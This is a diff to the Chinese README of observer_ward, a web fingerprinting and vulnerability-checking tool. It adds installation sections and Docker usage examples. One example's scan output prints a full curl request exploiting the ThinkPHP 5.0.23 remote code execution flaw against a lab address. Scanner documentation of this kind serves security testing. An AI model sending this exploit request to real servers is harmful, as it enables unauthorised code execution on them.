@@ -73,17 +73,52 @@
 
 ## 安装
 
+### 源码安装
+
 - 从源码编译安装，更多可以查看github的action工作流文件 [workflow](https://github.com/emo-crab/observer_ward/blob/main/.github/workflows/post-release.yml)
 
 ```bash,no-run
 cargo build --release --manifest-path=observer_ward/Cargo.toml
 ```
 
+### 二进制安装
+
 - 从发布页面下载 [release](https://github.com/emo-crab/observer_ward/releases)
 - 如果是Mac系统可以通过brew安装
 
+### 使用Mac系统brew安装
+
 ```bash,no-run
 brew install observer_ward
+```
+
+### Docker镜像
+
+- docker镜像，`observer_ward`只有指纹识别功能
+
+```bash,no-run
+➜ docker run --rm -it kaliteam/observer_ward -t http://172.17.0.2
+[INFO ] probes loaded: 2223
+[INFO ] optimized probes: 7
+[INFO ] target loaded: 1
+target: http://172.17.0.2/
+ |_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
+ |_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
+```
+
+- `kaliteam/observer_ward:with_nuclei`是内置nuclei，在默认配置文件夹有`plugins`目录
+
+```bash,no-run
+➜  docker run --rm -it kaliteam/observer_ward:with_nuclei -t http://172.17.0.2 --plugin default
+[INFO ] probes loaded: 2223
+[INFO ] optimized probes: 7
+[INFO ] target loaded: 1
+target: http://172.17.0.2/
+ |_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
+ |_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
+  |_exploitable: [Critical] thinkphp-5023-rce: ThinkPHP 5.0.23 - Remote Code Execution
+   |_matched_at: http://172.17.0.2/index.php?s=captcha
+   |_shell: curl -X 'POST' -d '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.3.23' 'http://172.17.0.2/index.php?s=captcha'
 ```
 
 <!-- GETTING STARTED -->
@@ -311,7 +346,8 @@ Options:
 {"target":"https://www.example.com/","matched_result":{"https://www.example.com/":{"title":["Example Domain"],"status":200,"favicon":{},"fingerprints":[],"nuclei-result":{}}}}
 ```
 
-- 再保存文件的同时也会在终端打印进度信息，如果要想只打印纯结果数据可以使用`--silent`开启静默模式，例如：我只想打印`json`格式的数据并输出到jq
+- 再保存文件的同时也会在终端打印进度信息，如果要想只打印纯结果数据可以使用`--silent`开启静默模式，例如：我只想打印`json`
+  格式的数据并输出到jq
 
 ```bash,no-run
 ➜  ~ ./observer_ward_amd64 -t http://172.17.0.2 --format json --or --oc --silent |jq
@@ -366,7 +402,8 @@ Press CTRL+C to quit
 ### 更新nuclei插件
 
 - 使用`--update-plugin`更新nuclei插件到配置文件夹的`plugins`目录
-- 当然你也可以手动将[plugins.zip](https://github.com/0x727/FingerprintHub/releases/download/defaultv4/plugins.zip)下载到配置文件夹并解压
+- 当然你也可以手动将[plugins.zip](https://github.com/0x727/FingerprintHub/releases/download/defaultv4/plugins.zip)
+  下载到配置文件夹并解压
 - 注意：每次更新会将原来的插件文件夹删除掉再解压，如果你有自己的插件需要单独存放在别的文件夹
 
 ### 集成nuclei验证漏洞
